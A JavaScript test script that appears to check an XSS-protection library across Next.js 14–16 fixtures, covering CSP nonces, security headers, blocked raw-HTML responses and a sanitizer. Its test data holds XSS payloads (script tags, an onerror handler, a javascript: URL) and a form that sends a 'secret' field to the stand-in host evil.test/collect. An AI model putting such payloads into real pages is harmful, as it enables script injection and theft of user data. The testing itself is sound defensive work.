import {verifyRoutePolicy} from "./test-route-policy.mjs";
import assert from "node:assert/strict";
import {spawn} from "node:child_process";
import {access, rm} from "node:fs/promises";
import {fileURLToPath} from "node:url";
import process from "node:process";

import {chromium, firefox, webkit} from "playwright-core";
import {verifyStyleAttributes} from "./test-style-attributes.mjs";
import {verifyCspStyles} from "./test-csp-styles.mjs";
import {verifyCspDiagnostics} from "./test-csp-diagnostics.mjs";
import {SafeResponse} from "next-xss-sbyd";
import {sanitizeUserHtml} from "next-xss-sbyd/sanitize";
import {verifyNativePdf, chromePath} from "./test-native-pdf.mjs";
import {verifyMarkdown} from "./test-markdown-next.mjs";
import {verifyHtmlIframe} from "./test-html-iframe-next.mjs";
import {verifySanitizerLifecycle} from "./sanitizer-lifecycle.mjs";

const allFixtures = [
  {name: "next14", port: 3214, edge: true, pages: true},
  {name: "next15", port: 3215, edge: true, pages: false},
  {name: "next16", port: 3216, edge: false, pages: false},
];

const requestedFixtures = process.argv.slice(2).filter((arg) => !arg.startsWith("--mode="));
const requestedModes = process.argv.slice(2).filter((arg) => arg.startsWith("--mode="))
  .map((arg) => arg.slice("--mode=".length));
const modes = requestedModes.length === 0 ? ["preload", "instrumentation"] : requestedModes;
assert(modes.every((mode) => mode === "preload" || mode === "instrumentation"),
  "Expected --mode=preload or --mode=instrumentation");
const unknownFixtures = requestedFixtures.filter(
  (name) => !allFixtures.some((fixture) => fixture.name === name),
);
if (unknownFixtures.length > 0) {
  throw new Error(
    `Unknown compatibility fixture(s): ${unknownFixtures.join(", ")}. ` +
      `Expected one or more of: ${allFixtures.map((fixture) => fixture.name).join(", ")}`,
  );
}
const fixtures =
  requestedFixtures.length === 0
    ? allFixtures
    : allFixtures.filter((fixture) => requestedFixtures.includes(fixture.name));

function run(command, args, options = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {stdio: "inherit", ...options});
    child.once("error", reject);
    child.once("exit", (code, signal) => {
      if (code === 0) resolve();
      else reject(new Error(`${command} ${args.join(" ")} exited with ${code ?? signal}`));
    });
  });
}

async function waitForServer(origin, child) {
  for (let attempt = 0; attempt < 120; attempt += 1) {
    if (child.exitCode !== null) throw new Error(`fixture server exited with ${child.exitCode}`);
    try {
      const response = await fetch(origin, {redirect: "manual"});
      if (response.status > 0) return;
    } catch {
      // The server is still starting.
    }
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error(`fixture server did not become ready at ${origin}`);
}

function assertSecurityHeaders(response, name) {
  assert(response.headers.get("x-content-type-options") === "nosniff", `${name}: missing nosniff`);
  assert(
    response.headers.get("referrer-policy") === "strict-origin-when-cross-origin",
    `${name}: missing referrer policy`,
  );
  assert(response.headers.get("content-security-policy")?.includes("strict-dynamic"), `${name}: missing CSP`);
}

async function stopServer(server) {
  if (server.exitCode !== null || server.signalCode !== null) return;

  await new Promise((resolve) => {
    function signalServerTree(signal) {
      if (process.platform === "win32") {
        server.kill(signal);
        return;
      }
      try {
        process.kill(-server.pid, signal);
      } catch (error) {
        if (error?.code !== "ESRCH") throw error;
      }
    }

    const forceKill = setTimeout(() => signalServerTree("SIGKILL"), 5_000);
    server.once("exit", () => {
      clearTimeout(forceKill);
      resolve();
    });
    signalServerTree("SIGTERM");
  });
}

// Override NODE_OPTIONS entirely: inherited --import/--require flags must not mask
// a missing hook. This intentionally also discards inherited memory/debug flags.
// Invoke Next directly so npm scripts cannot add another preload.
function fixtureEnvironment(mode, disableHook = false) {
  return {
    ...process.env,
    NODE_OPTIONS: mode === "preload" ? "--import next-xss-sbyd/enforce/preload" : "",
    NEXT_XSS_SBYD_SKIP_INSTRUMENTATION: disableHook ? "1" : "0",
  };
}

async function verifyGuardInstalled(origin, label) {
  const response = await fetch(`${origin}/api/response-factories?factory=guard`);
  assert.equal(response.status, 200, `${label}: guard probe failed`);
  assert.equal((await response.json()).installed, true, `${label}: response guard missing before handlers`);
}

async function verifyFixture(browser, fixture, mode, disableHook = false) {
  const label = `${fixture.name} / ${mode}${disableHook ? " / disabled hook" : ""}`;
  console.log(`${label}: starting production server`);
  const directory = new URL(`../fixtures/${fixture.name}/`, import.meta.url);
  const server = spawn(process.execPath, ["node_modules/next/dist/bin/next", "start", "-p", String(fixture.port)], {
    cwd: directory,
    detached: process.platform !== "win32",
    env: fixtureEnvironment(mode, disableHook),
    stdio: ["ignore", "pipe", "pipe"],
  });
  const closed = new Promise((resolve) => server.once("close", resolve));
  let output = "";
  function captureOutput(chunk) {
    output += chunk.toString();
  }
  server.stdout.on("data", captureOutput);
  server.stderr.on("data", captureOutput);
  server.stdout.pipe(process.stdout);
  server.stderr.pipe(process.stderr);
  const origin = `http://127.0.0.1:${fixture.port}`;

  try {
    await waitForServer(origin, server);

    if (disableHook) {
      await assert.rejects(verifyGuardInstalled(origin, label), /response guard missing before handlers/);
      const raw = await fetch(`${origin}/api/response-factories?factory=raw-global`);
      if (fixture.name === "next16") {
        assert.equal(raw.status, 500, `${label}: explicit route wrapper did not reject unsafe HTML`);
        assert(!(await raw.text()).includes("<unsafe>"), `${label}: wrapper leaked raw HTML`);
      } else {
        assert.equal(raw.status, 200, `${label}: unexpected enforcement with the hook disabled`);
        assert.equal(await raw.text(), "<unsafe>", `${label}: negative control did not serve raw HTML`);
      }
      console.log(`${label}: missing installation detected (negative control passed)`);
      return;
    }
    await verifyGuardInstalled(origin, label);
    await verifyRoutePolicy(browser, origin, label);

    const chromiumLabel = `${label} Chromium ${browser.version()}`;
    await verifyStyleAttributes(browser, origin, chromiumLabel);
    console.log(`${chromiumLabel}: style attribute checks passed`);
    if (fixture.name === "next16") {
      await verifyCspStyles(browser, origin);
      await verifyCspDiagnostics(browser, origin);
    }
    // Style attribute checks use installed engines; Next 16 dependency checks also use
    // WebKit when explicitly requested. The remaining checks use Chromium.
    for (const engine of [firefox, webkit]) {
      const requiredWebKit = engine === webkit && process.env.CSP_WEBKIT === "1";
      if (!requiredWebKit) {
        try {
          await access(engine.executablePath());
        } catch {
          console.log(`${label}: ${engine.name()} style coverage unavailable (browser binary not installed)`);
          continue;
        }
      }
      const additionalBrowser = await engine.launch({headless: true});
      try {
        const engineLabel = `${label} ${engine.name()} ${additionalBrowser.version()}`;
        await verifyStyleAttributes(additionalBrowser, origin, engineLabel);
        console.log(`${engineLabel}: style attribute checks passed`);
        if (requiredWebKit && fixture.name === "next16") {
          await verifyCspStyles(additionalBrowser, origin);
          await verifyCspDiagnostics(additionalBrowser, origin);
        }
      } finally {
        await additionalBrowser.close();
      }
    }

    const passThrough = await fetch(origin);
    assert(passThrough.status === 200, `${label}: pass-through failed`);
    assertSecurityHeaders(passThrough, label);

    const reportOnly = await fetch(`${origin}/?report-only=1`);
    assert(reportOnly.status === 200, `${label}: report-only pass-through failed`);
    assert(
      reportOnly.headers.get("content-security-policy-report-only")?.includes("strict-dynamic"),
      `${label}: missing report-only CSP`,
    );
    assert(reportOnly.headers.get("content-security-policy") === null, `${label}: report-only mode enforced CSP`);

    const staticPage = await fetch(`${origin}/static`);
    assert(staticPage.status === 200, `${label}: excluded static route failed`);
    assert((await staticPage.text()).includes(`static-${fixture.name}`), `${label}: excluded static route content failed`);
    assert(staticPage.headers.get("content-security-policy") === null, `${label}: nonce CSP matched a static route`);

    const rewrite = await fetch(`${origin}/?mode=rewrite`);
    assert((await rewrite.text()).includes(`localized-${fixture.name}`), `${label}: rewrite failed`);
    assertSecurityHeaders(rewrite, label);

    const redirect = await fetch(`${origin}/?mode=redirect`, {redirect: "manual"});
    assert(redirect.status >= 300 && redirect.status < 400, `${label}: redirect failed`);
    assertSecurityHeaders(redirect, label);

    const direct = await fetch(`${origin}/?mode=direct`);
    assert(direct.status === 202 && (await direct.text()) === "direct", `${label}: direct response failed`);
    assertSecurityHeaders(direct, label);

    const cookie = await fetch(`${origin}/?mode=cookie`);
    assert(cookie.headers.get("set-cookie")?.includes("fixture=yes"), `${label}: cookie mutation failed`);
    assertSecurityHeaders(cookie, label);

    const thrown = await fetch(`${origin}/?mode=throw`);
    assert(thrown.status === 500, `${label}: thrown errors did not propagate to Next`);

    if (fixture.name === "next14") {
      const safe = await fetch(`${origin}/api/enforced?mode=safe`);
      assert(safe.status === 200 && await safe.text() === "&lt;safe&gt;", `${label}: safe Pages response failed`);
      assert(safe.headers.get("content-type") === "text/html; charset=utf-8", `${label}: safe Pages content type changed`);
      assert(safe.headers.get("x-content-type-options") === "nosniff", `${label}: safe Pages nosniff missing`);

      const json = await fetch(`${origin}/api/enforced?mode=json`);
      assert(json.status === 200 && (await json.json()).ok === true, `${label}: Pages JSON response changed`);
      const buffer = await fetch(`${origin}/api/enforced?mode=buffer`);
      assert(buffer.status === 200 && await buffer.text() === "bytes", `${label}: Pages buffer response changed`);
      const empty = await fetch(`${origin}/api/enforced?mode=empty`);
      assert(empty.status === 204 && await empty.text() === "", `${label}: Pages 204 response changed`);
      const plain = await fetch(`${origin}/api/enforced?mode=plain`);
      assert(plain.status === 200 && await plain.text() === "raw", `${label}: passive Pages string failed`);
      const blocked = await fetch(`${origin}/api/enforced?mode=html`);
      assert(blocked.status === 500, `${label}: active Pages string was not blocked`);
    }

    {
      const enforced = await fetch(`${origin}/api/constructor-enforced`);
      assert(enforced.status === 200, `${label}: response wrapper route failed`);
      assert(await enforced.text() === "&lt;safe&gt;", `${label}: NextResponse did not unwrap SafeHtml`);
      assert(enforced.headers.get("content-type") === "text/html; charset=utf-8", `${label}: NextResponse content type changed`);
      assert(enforced.headers.get("x-content-type-options") === "nosniff", `${label}: NextResponse nosniff missing`);

      // Production route bundles currently capture Response after register() on
      // Next 14–16. Check both modes so a change in that load order fails loudly.
      // The fresh-process issue-197 test separately exercises the late-install limit.
      const blocked = await fetch(`${origin}/api/constructor-enforced?mode=unsafe`);
      assert(blocked.status === 500, `${label}: NextResponse accepted raw HTML`);
      assert(!(await blocked.text()).includes("<unsafe>"), `${label}: NextResponse leaked raw HTML`);

      const safeGlobal = await fetch(`${origin}/api/response-factories?factory=safe-global`);
      assert.equal(safeGlobal.status, 200, `${label}: SafeResponse failed`);
      assert.equal(await safeGlobal.text(), "&lt;safe&gt;", `${label}: SafeResponse HTML changed`);
      assert.equal(safeGlobal.headers.get("content-type"), "text/html; charset=utf-8", `${label}: SafeResponse content type changed`);
      assert.equal(safeGlobal.headers.get("x-content-type-options"), "nosniff", `${label}: SafeResponse nosniff missing`);
      const rawGlobal = await fetch(`${origin}/api/response-factories?factory=raw-global`);
      assert.equal(rawGlobal.status, 500, `${label}: global Response accepted raw HTML`);
      assert(!(await rawGlobal.text()).includes("<unsafe>"), `${label}: global Response leaked raw HTML`);
    }

    if (fixture.edge) {
      const edge = await fetch(`${origin}/api/edge`);
      assert(edge.status === 200 && (await edge.json()).runtime === "edge", `${label}: Edge route failed`);
    }

    {
      for (const mode of ["json", "next-json"]) {
        const response = await fetch(`${origin}/api/response-factories?factory=${mode}`);
        assert(response.status === 400, `${label}: ${mode} error became HTTP ${response.status}`);
        assert(response.headers.get("content-type")?.includes("application/json"), `${label}: ${mode} content type changed`);
        assert((await response.json()).error === "invalid format", `${label}: ${mode} error body changed`);
      }
      for (const mode of ["json-content-type", "next-json-content-type"]) {
        for (const shape of ["string", "object"]) {
          for (const contentType of ["text/html", "Text/HTML; charset=utf-8", "application/xhtml+xml",
            "application/json", "application/problem+json"]) {
            const query = new URLSearchParams({factory: mode, shape, contentType});
            const response = await fetch(`${origin}/api/response-factories?${query}`);
            const body = await response.text();
            const caseLabel = `${label}: ${mode} ${shape} ${contentType}`;
            if (contentType === "application/json" || contentType === "application/problem+json") {
              assert(response.status === 200, `${caseLabel}: passive JSON was rejected`);
              assert(response.headers.get("content-type") === contentType, `${caseLabel}: content type changed`);
              const payload = "<script>globalThis.__JSON_XSS__ = true</script>";
              assert(body === JSON.stringify(shape === "object" ? {value: payload} : payload), `${caseLabel}: body changed`);
            } else {
              assert(response.status === 500, `${caseLabel}: active JSON was not blocked`);
              assert(!body.includes("__JSON_XSS__"), `${caseLabel}: unsafe payload reached the client`);
            }
          }
        }
      }
      for (const [mode, status] of [["redirect", 307], ["next-redirect", 308]]) {
        const response = await fetch(`${origin}/api/response-factories?factory=${mode}`, {redirect: "manual"});
        assert(response.status === status, `${label}: ${mode} status changed`);
        assert(response.headers.get("location") === "https://example.test/export", `${label}: ${mode} location changed`);
      }
      const response = await fetch(`${origin}/api/response-factories?factory=identity`);
      assert(response.status === 200, `${label}: Response.error identity route failed`);
      const identity = await response.json();
      assert(identity.response === true && identity.nextResponse === false, `${label}: Response.error identity changed`);
      assert(identity.status === 0 && identity.type === "error", `${label}: Response.error semantics changed`);
    }

    {
      const guarded = await fetch(`${origin}/api/jsx-guard`);
      const result = await guarded.json();
      assert(guarded.status === 200 && result.blocked === 2, `${label}: JSX runtime did not block every raw-HTML form`);
      assert(result.benign === true, `${label}: JSX runtime changed benign props`);
      assert(result.safe === true, `${label}: JSX runtime did not unwrap authentic SafeHtml`);
      assert(result.runtime === (fixture.edge ? "edge" : "nodejs"), `${label}: JSX guard ran in the wrong runtime`);
    }

    {
      const guardedPage = await browser.newPage();
      await guardedPage.goto(`${origin}/jsx-guard?report-only=1`, {waitUntil: "load"});
      assert(await guardedPage.locator("main").getAttribute("data-rsc-guard") === "1", `${label}: RSC JSX guard did not block raw HTML`);
      await guardedPage.locator('[data-client-guard="1"]').waitFor();
      await guardedPage.close();
    }

    if (fixture.pages) {
      const pages = await fetch(`${origin}/legacy`);
      const pagesHtml = await pages.text();
      assert(pagesHtml.includes("next14-pages-") && pagesHtml.includes("true"), `${label}: Pages Router failed`);
    }

    await verifySanitizerLifecycle(browser, origin, fixture);
    await verifyHtmlIframe(browser, origin, fixture.name);
    await verifyMarkdown(browser, origin, fixture.name);

    const page = await browser.newPage();
    const collectorRequests = [];
    const cspReports = [];
    page.on("request", (request) => {
      if (request.resourceType() === "cspreport") cspReports.push(request.url());
      else if (request.url().includes("evil.test") || request.url().includes("/collect")) collectorRequests.push(request.url());
    });
    const documentResponse = await page.goto(origin, {waitUntil: "networkidle"});
    const nonceResult = await page.evaluate(() => {
      const expected = document.querySelector("main")?.getAttribute("data-nonce");
      const scripts = [...document.scripts].filter((script) => !script.type || script.type === "text/javascript");
      return {
        expected,
        nonceProbe: globalThis.__NONCE_PROBE__ === true,
        nonces: scripts.map((script) => script.nonce),
      };
    });
    assert(nonceResult.expected && nonceResult.expected !== "missing", `${label}: request nonce unavailable`);
    assert(
      documentResponse?.headers()["content-security-policy"]?.includes(`nonce-${nonceResult.expected}`),
      `${label}: response CSP nonce did not match the document nonce`,
    );
    assert(nonceResult.nonceProbe, `${label}: nonce-authorized script did not execute`);
    assert(nonceResult.nonces.length > 0, `${label}: no executable scripts found`);
    assert(
      nonceResult.nonces.every((nonce) => nonce === nonceResult.expected),
      `${label}: an executable script lacked the request nonce`,
    );
    assert(await page.locator('[data-suspense="resolved"]').textContent() === "suspense-ready", `${label}: Suspense did not resolve`);
    assert(await page.locator("text=sanitized-rich-text").count() === 1, `${label}: sanitized rich text missing`);
    assert(
      await page.evaluate(() => globalThis.__XSS_SBYD_PAYLOAD__ === undefined),
      `${label}: an XSS payload sentinel executed`,
    );
    assert(await page.locator("img, base, form").count() === 0, `${label}: active sanitized markup survived`);
    assert(collectorRequests.length === 0, `${label}: an XSS payload sent a collector request`);
    console.log(`${label}: ${cspReports.length} CSP reports observed separately from payload requests.`);
    const state = await page.locator("#fixture-state").textContent();
    assert(JSON.parse(state).breakout.startsWith("</script>"), `${label}: JSON state did not round-trip safely`);
    await page.close();

    if (fixture.name !== "next14") {
      const blocked = await fetch(`${origin}/api/vulnerable`);
      assert(blocked.status === 500, `${label}: response wrapper did not block raw HTML`);
    } else {
      const vulnerable = await browser.newPage();
      await vulnerable.goto(`${origin}/api/vulnerable`, {waitUntil: "load"});
      assert(
        await vulnerable.evaluate(() => globalThis.__XSS_SBYD_VULNERABLE__ === "executed"),
        `${label}: known-vulnerable payload did not execute before protections`,
      );
      await vulnerable.close();
    }
  } catch (error) {
    const message = error.message.startsWith(`${label}:`) ? error.message : `${label}: ${error.message}`;
    throw new Error(message, {cause: error});
  } finally {
    await stopServer(server);
    // ChildProcess close follows exit and drainage of both captured streams.
    await closed;
  }
  const repeatedInstallation = output.includes("response enforcement is already installed");
  assert.equal(repeatedInstallation, mode === "preload", mode === "preload"
    ? `${label}: preload did not exercise the instrumentation hook's duplicate installation`
    : `${label}: instrumentation was masked by an earlier installation`);
  console.log(`${label}: compatibility passed`);
}

async function verifySanitizedRichText(browser) {
  const payload = `<p>sanitized-rich-text</p>
    <script>globalThis.__XSS_SBYD_SANITIZER__ = "script"</script>
    <img src="data:text/html,bad" onerror="globalThis.__XSS_SBYD_SANITIZER__ = 'event'">
    <a href="javascript:globalThis.__XSS_SBYD_SANITIZER__ = 'url'">bad URL</a>
    <base href="https://evil.test/"><form action="https://evil.test/collect"><input name="secret"></form>`;
  const html = await new SafeResponse(sanitizeUserHtml(payload)).text();
  const page = await browser.newPage();
  const collectorRequests = [];
  page.on("request", (request) => {
    if (request.url().includes("evil.test")) collectorRequests.push(request.url());
  });
  await page.setContent(html, {waitUntil: "networkidle"});
  assert(await page.locator("p").textContent() === "sanitized-rich-text", "sanitizer removed inert rich text");
  assert(await page.locator("script, base, form").count() === 0, "sanitizer retained an active element");
  assert(await page.locator("img").getAttribute("src") === null, "sanitizer retained an invalid image URL");
  assert(await page.locator("img").getAttribute("onerror") === null, "sanitizer retained an image handler");
  assert(await page.locator("a").getAttribute("href") === null, "sanitizer retained an executable URL");
  assert(await page.evaluate(() => globalThis.__XSS_SBYD_SANITIZER__ === undefined), "sanitizer payload executed");
  assert(collectorRequests.length === 0, "sanitizer payload sent a collector request");
  await page.close();
}

const browser = await chromium.launch({headless: true, executablePath: await chromePath()});
try {
  await verifyNativePdf(browser);
  await verifySanitizedRichText(browser);
  for (const fixture of fixtures) {
    const directory = new URL(`../fixtures/${fixture.name}/`, import.meta.url);
    await run("npm", ["ci"], {cwd: directory, env: fixtureEnvironment("instrumentation")});
    for (const mode of modes) {
      console.log(`${fixture.name} / ${mode}: building production fixture`);
      // Rebuild per mode so preload in build/prerender workers cannot mask an
      // instrumentation-only build. The extra local build is intentional isolation.
      await rm(new URL(".next/", directory), {recursive: true, force: true});
      await run(process.execPath, [fileURLToPath(new URL("node_modules/next/dist/bin/next", directory)), "build"], {
        cwd: directory, env: fixtureEnvironment(mode),
      });
      if (mode === "instrumentation") await verifyFixture(browser, fixture, mode, true);
      await verifyFixture(browser, fixture, mode);
    }
  }
} finally {
  await browser.close();
}
if (fixtures.some((fixture) => fixture.name === "next16")) await import("./test-route-cache-components.mjs");
console.log(`${fixtures.length * modes.length} compatibility run(s) passed: ${fixtures.map((fixture) => fixture.name).join(", ")} × ${modes.join(", ")}.`);
